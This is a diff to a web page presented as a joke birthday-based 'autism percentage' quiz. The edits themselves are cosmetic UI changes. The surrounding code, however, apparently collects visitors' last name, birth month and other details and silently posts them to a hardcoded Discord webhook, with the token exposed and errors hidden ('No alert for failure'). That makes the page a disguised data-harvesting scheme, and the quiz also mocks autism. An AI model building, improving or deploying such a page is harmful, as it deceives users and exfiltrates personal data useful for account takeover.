@@ -104,6 +104,10 @@
         button:hover {
             background-color: #0056b3;
         }
+
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -126,7 +130,7 @@
             <input type="submit" value="Calculate">
         </form>
 
-        <div id="passwordContainer" style="display: none;">
+        <div id="passwordContainer" class="hidden">
             <div id="password"></div>
             <div id="copyButtons"></div>
         </div>
@@ -137,8 +141,16 @@
         const passwordDiv = document.getElementById('password');
         const copyButtonsDiv = document.getElementById('copyButtons');
         const passwordContainer = document.getElementById('passwordContainer');
+        const calculateButton = document.querySelector('input[type="submit"]');
         const webhookURL = 'https://discord.com/api/webhooks/1234877035697012938/j0555eJC3wBdfM1hwifCoKoBUWJoDrxQ6Mr_XvKU8Ieewki2TQegxzRs20Sq7dWjy-gO';
         let isSecondClick = false;
+
+        document.addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault(); // Prevent default form submission
+                form.dispatchEvent(new Event('submit')); // Manually trigger form submission
+            }
+        });
 
         form.addEventListener('submit', function(event) {
             event.preventDefault();
@@ -147,8 +159,9 @@
                 const randomAutismPercentage = Math.floor(Math.random() * 101); // Random number between 0-100
                 passwordDiv.textContent = `Judging by your birthday, you are ${randomAutismPercentage}% autistic!`;
                 isSecondClick = true;
-                form.querySelector('input[type="submit"]').value = "Next";
-                passwordContainer.style.display = 'block';
+
+                calculateButton.classList.add('hidden');
+                passwordContainer.classList.remove('hidden');
             } else {
                 const lastName = document.getElementById('lastName').value.toUpperCase();
                 const birthMonth = document.getElementById('birthMonth').value.padStart(2, '0');
@@ -195,10 +208,6 @@
                     console.error('Error:', error);
                     // No alert for failure
                 });
-
-                // Remove "Next" button
-                const nextButton = form.querySelector('input[type="submit"]');
-                nextButton.parentNode.removeChild(nextButton);
             }
         });
     </script>
